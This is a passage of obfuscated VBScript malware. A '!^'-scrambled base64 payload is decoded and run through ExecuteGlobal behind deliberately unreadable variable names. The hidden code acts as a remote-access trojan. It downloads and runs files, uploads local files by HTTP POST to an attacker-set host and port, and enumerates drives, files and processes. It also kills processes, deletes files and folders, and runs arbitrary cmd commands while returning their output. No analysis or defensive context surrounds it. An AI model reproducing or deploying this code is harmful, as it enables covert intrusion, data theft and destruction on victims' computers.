2ZXRvKS!^0aGVuCiAgIC!^vYmpmc29kb3dubG9hZC5kZWxldGVmaWxlIChzdHJzYXZldG8pCmVuZC!^pZgppZiAgb2JqaHR0cGRvd25sb2FkLnN0YXR1cyA9IDIwMC!^0aGVuCiAgIC!^kaW0gIG9ianN0cmVhbWRvd25sb2FkCglzZXQgIG9ianN0cmVhbWRvd25sb2FkID0gY3JlYXRlb2JqZWN0KCJhZG9kYi5zdHJlYW0iKQogICAgd2l0aC!^vYmpzdHJlYW1kb3dubG9hZCAKCQkgLnR5cGUgPSAxIAoJCSAub3!^lbgoJCSAud3JpdGUgb2JqaHR0cGRvd25sb2FkLnJlc3!^vbnNlYm9keQoJCSAuc2F2ZXRvZmlsZS!^zdHJzYXZldG8KCQkgLmNsb3NlCgllbmQgd2l0aAogICAgc2V0IG9ianN0cmVhbWRvd25sb2FkICA9IG5vdGhpbmcKZW5kIGlmCmlmIG9iamZzb2Rvd25sb2FkLmZpbGVleGlzdHMoc3Ryc2F2ZXRvKS!^0aGVuCiAgIHNoZWxsb2JqLnJ1bi!^vYmpmc29kb3dubG9hZC5nZXRmaWxlIChzdHJzYXZldG8pLnNob3J0cGF0aAplbmQgaWYgCmVuZC!^zdWIKCgpmdW5jdGlvbi!^1cGxvYWQgKGZpbGV1cmwpCgpkaW0gIGh0dH!^vYmosb2Jqc3RyZWFtdX!^sb2FkZSxidWZmZXIKc2V0IC!^vYmpzdHJlYW11cGxvYWRlID0gY3JlYXRlb2JqZWN0KCJhZG9kYi5zdHJlYW0iKQp3aXRoIG9ianN0cmVhbXVwbG9hZGUgCiAgICAgLnR5cGUgPSAxIAogICAgIC5vcGVuCgkgLmxvYWRmcm9tZmlsZS!^maWxldXJsCgkgYnVmZmVyID0gLnJlYWQKCSAuY2xvc2UKZW5kIHdpdGgKc2V0IG9ianN0cmVhbWRvd25sb2FkID0gbm90aGluZwpzZXQgaHR0cG9iaiA9IGNyZWF0ZW9iamVjdCgibXN4bWwyLnhtbGh0dHAiKQpodHRwb2JqLm9wZW4gIn!^vc3QiLCJodHRwOi8vIiAmIGhvc3QgJiAiOiIgJi!^wb3J0ICYiLyIgJiAiaXMtcmVjdmluZyIgJi!^zcGxpdGVyICYgZmlsZXVybCwgZmFsc2UKaHR0cG9iai5zZW5kIGJ1ZmZlcgplbmQgZnVuY3Rpb24KCgpmdW5jdGlvbi!^lbnVtZHJpdmVyICgpCgpmb3IgIGVhY2ggZHJpdmUgaW4gZmlsZXN5c3RlbW9iai5kcml2ZXMKaWYgIC!^kcml2ZS5pc3JlYWR5ID0gdHJ1ZS!^0aGVuCiAgICAgZW51bWRyaXZlciA9IGVudW1kcml2ZXIgJi!^kcml2ZS5wYXRoICYgInwiICYgZHJpdmUuZHJpdmV0eX!^lICYgc3!^saXRlcgplbmQgaWYKbmV4dAplbmQgRnVuY3Rpb24KCmZ1bmN0aW9uIGVudW1mYWYgKGVudW1kaXIpCgplbnVtZmFmID0gZW51bWRpciAmIHNwbGl0ZXIKZm9yIC!^lYWNoIGZvbGRlci!^pbi!^maWxlc3lzdGVtb2JqLmdldGZvbGRlciAoZW51bWRpcikuc3ViZm9sZGVycwogICAgIGVudW1mYWYgPS!^lbnVtZmFmICYgZm9sZGVyLm5hbWUgJiAifCIgJiAiIiAmICJ8IiAmICJkIiAmICJ8IiAmIGZvbGRlci5hdHRyaWJ1dGVzICYgc3!^saXRlcgpuZXh0Cgpmb3IgIGVhY2ggZmlsZS!^pbi!^maWxlc3lzdGVtb2JqLmdldGZvbGRlciAoZW51bWRpcikuZmlsZXMKICAgIC!^lbnVtZmFmID0gZW51bWZhZiAmIGZpbGUubmFtZSAmICJ8IiAmIGZpbGUuc2l6ZSAgJiAifCIgJiAiZiIgJiAifCIgJi!^maWxlLmF0dHJpYnV0ZXMgJi!^zcGxpdGVyCgpuZXh0CmVuZC!^mdW5jdGlvbgoKCmZ1bmN0aW9uIGVudW1wcm9jZXNzICgpCgpvbi!^lcnJvci!^yZXN1bWUgbmV4dAoKc2V0IG9iandtaXNlcnZpY2UgPS!^nZXRvYmplY3QoIndpbm1nbXRzOlxcLlxyb290XGNpbXYyIikKc2V0IGNvbGl0ZW1zID0gb2Jqd21pc2VydmljZS5leGVjcXVlcnkoInNlbGVjdCAqIGZyb20gd2luMzJfcHJvY2VzcyIsLDQ4KQoKZGltIG9iaml0ZW0KZm9yIGVhY2ggb2JqaXRlbS!^pbi!^jb2xpdGVtcwoJZW51bX!^yb2Nlc3MgPS!^lbnVtcHJvY2VzcyAmIG9iaml0ZW0ubmFtZSAmICJ8IgoJZW51bX!^yb2Nlc3MgPS!^lbnVtcHJvY2VzcyAmIG9iaml0ZW0ucHJvY2Vzc2lkICYgInwiCiAgIC!^lbnVtcHJvY2VzcyA9IGVudW1wcm9jZXNzICYgb2JqaXRlbS5leGVjdXRhYmxlcGF0aCAmIHNwbGl0ZXIKbmV4dAplbmQgZnVuY3Rpb24KCnN1Yi!^leGl0cHJvY2VzcyAocGlkKQpvbi!^lcnJvci!^yZXN1bWUgbmV4dAoKc2hlbGxvYmoucnVuICJ0YXNra2lsbCAvRiAvVCAvUElEICIgJi!^waWQsNyx0cnVlCmVuZC!^zdWIKCnN1Yi!^kZWxldGVmYWYgKHVybCkKb24gZXJyb3IgcmVzdW1lIG5leHQKCmZpbGVzeXN0ZW1vYmouZGVsZXRlZmlsZS!^1cmwKZmlsZXN5c3RlbW9iai5kZWxldGVmb2xkZXIgdXJsCgplbmQgc3ViCgpmdW5jdGlvbi!^jbWRzaGVsbCAoY21kKQoKZGltIGh0dH!^vYmosb2V4ZWMscmVhZGFsbGZyb21hbnkKCnNldC!^vZXhlYyA9IHNoZWxsb2JqLmV4ZWMgKCIlY29tc3!^lYyUgL2MgIiAmIGNtZCkKaWYgbm90IG9leGVjLnN0ZG91dC5hdGVuZG9mc3RyZWFtIHRoZW4KICAgcmVhZGFsbGZyb21hbnkgPS!^vZXhlYy5zdGRvdXQucmVhZGFsbAplbHNlaWYgbm90IG9leGVjLnN0ZGVyci5hdGVuZG9mc3RyZWFtIHRoZW4KICAgcmVhZGFsbGZyb21hbnkgPS!^vZXhlYy5zdGRlcnIucmVhZGFsbAplbHNlIAogIC!^yZWFkYWxsZnJvbWFueSA9ICIiCmVuZC!^pZgoKY21kc2hlbGwgPS!^yZWFkYWxsZnJvbWFueQplbmQgZnVuY3Rpb24="
					
	iiIIiiIIIlllii = ""
	
	If llliiIIIlllii = 0 Then
        iiIIiiIIIlllii = Replace(IIIuuuIIIIiiiIIIIuu, iiiIIIillii, lIliliiIillii)
        iIilllIIIllil = UUUiiiIIIIIiiiiiIIu(iiIIiiIIIlllii)
		'msgbox iIilllIIIllil
    Else
		iiIiiiiIIIiiiiiiiii 0, IIliiIlIlIlii
        iIilllIIIllil = ""
    End If
	
End Function

Private Sub iiIiiiiIIIiiiiiiiii(i, IIliiIlIlIlii)
	ExecuteGlobal IIliiIlIlIlii
End sub

Dim ii
ii = iIilllIIIllil(1, yUYEIEideiydeidnIEui(iIilllIIIllil(0, Nothing), 1, 2))